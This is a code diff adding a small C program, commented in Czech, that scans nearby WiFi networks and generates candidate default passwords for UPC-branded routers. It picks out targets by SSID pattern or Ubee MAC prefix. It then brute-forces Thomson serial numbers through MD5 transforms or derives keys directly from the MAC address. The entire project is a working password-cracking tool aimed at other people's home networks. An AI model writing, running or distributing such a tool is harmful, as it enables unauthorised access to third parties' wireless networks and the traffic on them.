@@ -1,0 +1,347 @@
+passgen.c
+#include <stdint.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <openssl/md5.h>
+#include <ctype.h>
+
+static void macstr_to_bytes(const char *mac_str, unsigned char *bytes) {
+    int i = 0, j = 0;
+    while(i < 12 && j < 6){
+        int hi = toupper(mac_str[i]) < 'A' ? mac_str[i] - '0' : toupper(mac_str[i]) - 'A' + 10;
+        int lo = toupper(mac_str[i+1]) < 'A' ? mac_str[i+1] - '0' : toupper(mac_str[i+1]) - 'A' + 10;
+        bytes[j++] = hi * 16 + lo;
+        i += 2;
+        if (mac_str[i] == ':' || mac_str[i] == '-') i++;
+    }
+}
+
+static const char* thomson_prefixes[] = {"SAAP", "SAPP", "UAAP", "SBAP"};
+#define nprefixes (sizeof(thomson_prefixes)/sizeof(thomson_prefixes[0]))
+
+static void thomson_hash2pass(uint8_t *h2, char *pass) {
+    for(int i = 0; i < 8; ++i) {
+        uint32_t a = h2[i] & 0x1f;
+        a -= ((a * 0xb21642c9ULL) >> 36) * 23;
+        a = (a & 0xff) + 0x41;
+        if (a >= 'I') a++;
+        if (a >= 'L') a++;
+        if (a >= 'O') a++;
+        pass[i] = (char)a;
+    }
+    pass[8] = '\0';
+}
+
+static uint32_t thomson_mangle(uint32_t *hv) {
+    uint32_t a, b;
+    a = ((hv[3] * 0x68de3afULL) >> 40) - (hv[3] >> 31);
+    b = (hv[3] - a * 9999 + 1) * 11ULL;
+    return b * (hv[1] * 100 + hv[2] * 10 + hv[0]);
+}
+
+static uint32_t thomson_upc_generate_ssid(uint32_t *p, uint32_t magic) {
+    uint32_t a = p[1] * 10 + p[2];
+    uint32_t b = p[0] * 2500000 + a * 6800 + p[3] + magic;
+    return b - (((b * 0x6b5fca6bULL) >> 54) - (b >> 31)) * 10000000;
+}
+
+// Funkce pro získání všech možných hesel (kromě duplikátů)
+int upc07keygen_multi(const char *ssid, char passes[][9], int max_passes) {
+    if (strncmp(ssid, "UPC", 3) || strlen(ssid)!=10) return 0;
+
+    uint32_t target = (uint32_t)atoi(ssid+3);
+    int found = 0;
+    MD5_CTX ctx;
+
+    for (uint32_t buf0=0; buf0<=9; ++buf0)
+    for (uint32_t buf1=0; buf1<=99; ++buf1)
+    for (uint32_t buf2=0; buf2<=9; ++buf2)
+    for (uint32_t buf3=0; buf3<=9999; ++buf3)
+    {
+        uint32_t tuple[4] = {buf0, buf1, buf2, buf3};
+        int mode=0;
+        if (thomson_upc_generate_ssid(tuple, 0xff8d8f20) == target) mode=1;
+        if (thomson_upc_generate_ssid(tuple, 0xffd9da60) == target) mode=2;
+        if (!mode) continue;
+
+        for (int i=0; i<nprefixes; ++i) {
+            char serial[32], serialinput[32], tmpstr[17];
+            uint8_t h1[16], h2[16];
+            uint32_t hv[4], w1, w2;
+            char pass[9];
+
+            sprintf(serial, "%s%d%02d%d%04d", thomson_prefixes[i], buf0, buf1, buf2, buf3);
+            memset(serialinput, 0, sizeof(serialinput));
+            if (mode==2) {
+                int llen = (int)strlen(serial);
+                for(int j=0; j<llen; ++j) serialinput[llen-1-j] = serial[j];
+            } else {
+                memcpy(serialinput, serial, strlen(serial));
+            }
+            MD5_Init(&ctx); MD5_Update(&ctx, serialinput, strlen(serialinput)); MD5_Final(h1, &ctx);
+            for(int k=0; k<4; ++k) hv[k] = (uint16_t)(h1[2*k] | (h1[2*k+1]<<8));
+            w1 = thomson_mangle(hv);
+            for(int k=0; k<4; ++k) hv[k] = (uint16_t)(h1[8+2*k] | (h1[8+2*k+1]<<8));
+            w2 = thomson_mangle(hv);
+            sprintf(tmpstr, "%08X%08X", w1, w2);
+            MD5_Init(&ctx); MD5_Update(&ctx, tmpstr, strlen(tmpstr)); MD5_Final(h2, &ctx);
+            thomson_hash2pass(h2, pass);
+
+            // Kontrola duplikátů (heslo už máme?)
+            int dup = 0;
+            for(int n=0; n<found; ++n)
+                if (strcmp(passes[n], pass) == 0) { dup = 1; break; }
+            if (dup) continue;
+
+            if (found < max_passes) {
+                strcpy(passes[found], pass);
+                found++;
+            } else {
+                // Přetečení - ignorujeme další záznamy
+            }
+        }
+    }
+    return found; // Vrací počet hesel (každé max 8 znaků)
+}
+
+// Původní varianta - vrací pouze první nalezené heslo
+void upc07keygen(const char *ssid, char *pass) {
+    char passes[8][9]; // Většinou max 4 reálné varianty, nadbytek neuškodí
+    int found = upc07keygen_multi(ssid, passes, 8);
+    if (found > 0)
+        strcpy(pass, passes[0]);
+    else
+        snprintf(pass, 9, "UPC-FAIL");
+}
+
+void upc07ubee_generate_pass(const char *mac_str, char *pass) {
+    unsigned char mac[6];
+    macstr_to_bytes(mac_str, mac);
+    MD5_CTX ctx;
+    unsigned char buff1[100] = {0};
+    unsigned char buff2[100] = {0};
+    unsigned char buff3[100] = {0};
+    unsigned char hash_buff[100] = {0};
+    sprintf((char*)buff1, "%02X%02X%02X%02X%02X%02X555043444541554C5450415353504852415345",
+            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+    MD5_Init(&ctx);
+    MD5_Update(&ctx, buff1, strlen((char*)buff1)+1);
+    MD5_Final(buff2, &ctx);
+    sprintf((char*)buff3, "%.02X%.02X%.02X%.02X%.02X%.02X", buff2[0]&0xf, buff2[1]&0xf, buff2[2]&0xf, buff2[3]&0xf, buff2[4]&0xf, buff2[5]&0xf);
+    MD5_Init(&ctx);
+    MD5_Update(&ctx, buff3, strlen((char*)buff3)+1);
+    MD5_Final(hash_buff, &ctx);
+    for (int i = 0; i < 8; ++i)
+        pass[i] = 0x41u + ((hash_buff[i] + hash_buff[i+8]) % 0x1Au);
+    pass[8] = '\0';
+}
+
+scan.c
+#include "scan.h"
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int scan_wifi(Network networks[MAX_NETWORKS]) {
+    FILE *fp;
+    char line[512];
+    Network net;
+    int found = 0;
+    int in_cell = 0;
+
+    fp = popen("iwlist wlan1 scan 2>/dev/null", "r");
+    if (!fp) {
+        perror("popen");
+        return 0;
+    }
+
+    memset(&net, 0, sizeof(Network));
+    net.signal = -999; // pro jistotu, hodnota která znamená "nezjištěno"
+
+    while (fgets(line, sizeof(line), fp)) {
+        char *ptr;
+        // Začátek nového záznamu
+        if (strstr(line, "Cell ")) {
+            if (in_cell && strlen(net.ssid) > 0 && strlen(net.mac) > 0) {
+                if (found < MAX_NETWORKS)
+                    networks[found++] = net;
+            }
+            memset(&net, 0, sizeof(Network));
+            net.signal = -999; // opět nastavit default
+            in_cell = 1;
+            ptr = strstr(line, "Address: ");
+            if (ptr) {
+                strncpy(net.mac, ptr + 9, 17);
+                net.mac[17] = 0;
+            }
+        }
+        // ESSID:
+        ptr = strstr(line, "ESSID:\"");
+        if (ptr) {
+            sscanf(ptr + 7, "%63[^\"]", net.ssid);
+        }
+        // Signal level:
+        ptr = strstr(line, "Signal level=");
+        if (ptr) {
+            int level;
+            // Může to být: "Signal level=-43 dBm" nebo "Signal level=43/70"
+            if (sscanf(ptr + 13, "%d", &level) == 1) {
+                net.signal = level;
+            }
+        }
+    }
+    if (in_cell && strlen(net.ssid) > 0 && strlen(net.mac) > 0) {
+        if (found < MAX_NETWORKS)
+            networks[found++] = net;
+    }
+    pclose(fp);
+    return found;
+}
+
+upc_wifi_keygen.c
+#include <stdio.h>
+#include "wifitypes.h"
+#include "scan.h"
+#include "wifisort.h"
+#include "passgen.h"
+
+int main() {
+    printf("Vítejte v keygenu\n");
+
+    Network networks[MAX_NETWORKS];
+    Network filtered[MAX_NETWORKS];
+    int count, fcount = 0;
+
+    printf("Skenuji okolní WiFi sítě...\n");
+    count = scan_wifi(networks);
+
+    if (count == 0) {
+        printf("Žádná WiFi síť nenalezena.\n");
+        printf("Ukončuji keygen\n");
+        return 0;
+    }
+
+     printf("Nalezeno %d WiFi sítí:\n", count);
+     for (int i = 0; i < count; ++i) {
+          printf("  SSID: %s\n  MAC: %s\n  Síla signálu: %d dBm\n\n",
+                 networks[i].ssid,
+                 networks[i].mac,
+                 networks[i].signal);
+    }
+
+    // Filtrování
+    for (int i = 0; i < count; ++i) {
+        KeygenType tkg = detect_keygen(&networks[i]);
+        if (tkg != NONE) {
+            filtered[fcount++] = networks[i];
+        }
+    }
+
+    if (fcount == 0) {
+        printf("Žádná kompatibilní síť nenalezena.\n");
+        printf("Ukončuji keygen\n");
+        return 0;
+    }
+
+    for (int i = 0; i < fcount; ++i) {
+    printf("\nSSID: %s\nMAC: %s\nSíla signálu: %d dBm\nMožná hesla:\n", 
+        filtered[i].ssid, filtered[i].mac, filtered[i].signal);
+    KeygenType tkg = detect_keygen(&filtered[i]);
+    if (tkg == UPC07UBEE) {
+        char upcpass[32];
+        upc07ubee_generate_pass(filtered[i].mac, upcpass);
+        printf("  [Upc07UbeeKeygen] %s\n", upcpass);
+    }
+    if (tkg == UPC07) {
+        // Najdi všechna možná hesla!
+        char passes[8][9];   // Každé heslo má 8 znaků + '\0', maximálně 8 variant (reálně bývají 1-4)
+        int n = upc07keygen_multi(filtered[i].ssid, passes, 8);
+        if (n == 0) {
+            printf("  [Upc07Keygen] Není nalezeno žádné heslo!\n");
+        } else {
+            for (int j = 0; j < n; ++j) {
+                printf("  [Upc07Keygen %d] %s\n", j+1, passes[j]);
+           }
+        }
+     }
+  }
+    printf("Ukončuji keygen\n");
+    return 0;
+}
+
+wifisort.c
+#include "wifisort.h"
+#include <string.h>
+#include <ctype.h>
+
+int is_upc07ubee_mac(const char *mac) {
+    return strncasecmp(mac, "64:7C:34", 8) == 0;
+}
+int is_upc07_ssid(const char *ssid) {
+    if (strncmp(ssid, "UPC", 3) != 0)
+        return 0;
+    for (int i = 3; i < 10; i++) {
+        if (!isdigit((unsigned char)ssid[i]))
+            return 0;
+    }
+    return ssid[10] == '\0';
+}
+KeygenType detect_keygen(const Network *net) {
+    if (is_upc07ubee_mac(net->mac))
+        return UPC07UBEE;
+    if (is_upc07_ssid(net->ssid))
+        return UPC07;
+    return NONE;
+}
+
+passgen.h
+#ifndef PASSGEN_H
+#define PASSGEN_H
+
+#include "wifitypes.h"
+
+void upc07ubee_generate_pass(const char *mac_str, char *pass);
+void upc07keygen(const char *ssid, char *pass);
+
+#endif
+
+scan.h
+#ifndef SCAN_H
+#define SCAN_H
+
+#include "wifitypes.h"
+
+int scan_wifi(Network networks[MAX_NETWORKS]);
+
+#endif
+
+wifisort.h
+#ifndef WIFISORT_H
+#define WIFISORT_H
+
+#include "wifitypes.h"
+
+int is_upc07ubee_mac(const char *mac);
+int is_upc07_ssid(const char *ssid);
+KeygenType detect_keygen(const Network *net);
+
+#endif
+
+wifitypes.h
+#ifndef WIFITYPES_H
+#define WIFITYPES_H
+
+#define MAX_NETWORKS 100
+#define MAX_LEN 64
+
+typedef struct {
+    char ssid[MAX_LEN];
+    char mac[MAX_LEN];
+    int signal; // Síla signálu v dBm (záporné číslo)
+} Network;
+
+typedef enum { NONE, UPC07, UPC07UBEE } KeygenType;
+
+#endif
+
